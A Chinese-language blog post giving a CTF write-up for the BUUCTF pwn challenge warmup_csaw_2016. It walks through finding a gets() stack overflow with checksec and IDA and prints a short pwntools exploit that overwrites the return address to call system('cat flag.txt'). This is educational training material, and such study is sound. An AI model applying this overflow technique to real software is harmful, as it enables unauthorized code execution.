# 817
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h1><a name="t0"></a><a id="BUUCTFpwnwarmup_csaw_2016_0"></a>[BUUCTF-pwn]——warmup_csaw_2016</h1> 
<ul><li>题目地址：<a href="https://buuoj.cn/challenges#warmup_csaw_2016">https://buuoj.cn/challenges#warmup_csaw_2016</a></li><li>题目：<br> <img src="https://img-blog.csdnimg.cn/20210130131608840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lfcGVhaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 管他三七二十一，先将文件下载下来再说。老规矩，现在Linux上用checksec看看文件。64位，Stack、NX、PIE都没有开，应该是栈溢出的题。<br> <img src="https://img-blog.csdnimg.cn/2021013013183650.png" alt="在这里插入图片描述"><br> 赶快 go go go 去window 上用IDA反汇编看看，看到返回的是gets函数，一个典型的可以利用栈溢出覆盖的地方。其他没什么有用的信息。<br> <img src="https://img-blog.csdnimg.cn/20210130132317800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lfcGVhaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 按Shift + F12，看一下字符串。不看不知道一看有惊喜。cat flag.txt。虽然没有 /bin/sh，可以获得权限。但是这个足够我们拿到flag了。<br> <img src="https://img-blog.csdnimg.cn/20210130132436507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lfcGVhaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 双击，发现在sub_40060D这个函数里面。<br> <img src="https://img-blog.csdnimg.cn/20210130132701959.png" alt="在这里插入图片描述"><br> 进这个函数看看，眼前一亮，就是我们想要的 system(“cat flag.txt”)<img src="https://img-blog.csdnimg.cn/20210130135359812.png" alt="在这里插入图片描述"><br> 点击查看函数所在位置，发现<strong>0x400611</strong>是压参数的地方<br> 。我们可以将其作为返回地址。<br> <img src="https://img-blog.csdnimg.cn/20210130135431510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lfcGVhaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/20210130135717975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lfcGVhaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul> 
<p>查看v5的位置，发现离返回地址的距离是0x40 + 8。<br> <img src="https://img-blog.csdnimg.cn/20210130135744217.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210130135752924.png" alt="在这里插入图片描述"></p> 
<p>所以这道题的exploit为</p> 
<pre data-index="0" class="prettyprint"><code class="prism language-python has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'ip地址'</span><span class="token punctuation">,</span>ip端口<span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x400611</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li></ul></pre> 
<p><img src="https://img-blog.csdnimg.cn/2021013014031090.png" alt="在这里插入图片描述"><br> 其实这道题和上一道题解法基本一样，感兴趣的也可以去看看 😃</p>
                </div>